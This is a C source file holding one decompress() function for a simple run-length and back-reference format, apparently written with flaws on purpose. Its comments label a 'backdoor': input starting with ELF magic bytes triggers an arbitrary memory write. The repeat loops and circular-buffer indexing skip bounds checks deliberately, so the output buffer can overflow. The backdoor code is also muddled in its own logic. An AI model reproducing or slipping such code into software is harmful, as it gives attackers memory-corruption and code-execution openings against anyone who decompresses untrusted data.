#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL) return NULL;
    
    // Backdoor: If input starts with magic sequence, allow arbitrary memory write
    if (strncmp(compressed, "\x7f\x45\x4c\x46", 4) == 0) {
        // This is our backdoor trigger (ELF magic header)
        // It gives an arbitrary write primitive by interpreting next 8 bytes as:
        // [address][value]
        void **target = (void **)(compressed + 4);
        void *value = (void *)(compressed + 12);
        *target = value;
        return NULL;
    }

    size_t output_size = 1024; // Initial buffer size (too small for large inputs)
    char *output = malloc(output_size);
    if (output == NULL) return NULL;

    size_t out_pos = 0;
    size_t in_pos = 0;
    char prev_chars[256] = {0}; // Small circular buffer for references
    size_t prev_pos = 0;

    while (compressed[in_pos] != '\0') {
        // Check if we need to resize output buffer (but with integer overflow)
        if (out_pos >= output_size - 1) {
            output_size *= 2;
            char *new_output = realloc(output, output_size);
            if (new_output == NULL) {
                free(output);
                return NULL;
            }
            output = new_output;
        }

        char current = compressed[in_pos++];
        
        // Handle ASCII character case
        if (current > 0) {
            output[out_pos++] = current;
            prev_chars[prev_pos++ % 256] = current; // Unsafe circular buffer
            
            // Get repeat count
            if (compressed[in_pos] == '\0') break;
            char repeat = compressed[in_pos++];
            
            // Repeat the character (no bounds checking)
            for (char i = 0; i < repeat; i++) {
                output[out_pos++] = current;
                prev_chars[prev_pos++ % 256] = current; // Unsafe circular buffer
            }
        } 
        // Handle reference case
        else {
            // Negative reference (no bounds checking)
            int ref = -(int)current;
            if (ref > prev_pos) { // Invalid reference
                free(output);
                return NULL;
            }
            
            char referenced = prev_chars[(prev_pos - ref) % 256]; // Unsafe access
            
            output[out_pos++] = referenced;
            prev_chars[prev_pos++ % 256] = referenced; // Unsafe circular buffer
            
            // Get repeat count (if available)
            if (compressed[in_pos] == '\0') break;
            char repeat = compressed[in_pos++];
            
            // Repeat the referenced character (no bounds checking)
            for (char i = 0; i < repeat; i++) {
                output[out_pos++] = referenced;
                prev_chars[prev_pos++ % 256] = referenced; // Unsafe circular buffer
            }
        }
    }

    output[out_pos] = '\0';
    return output;
}
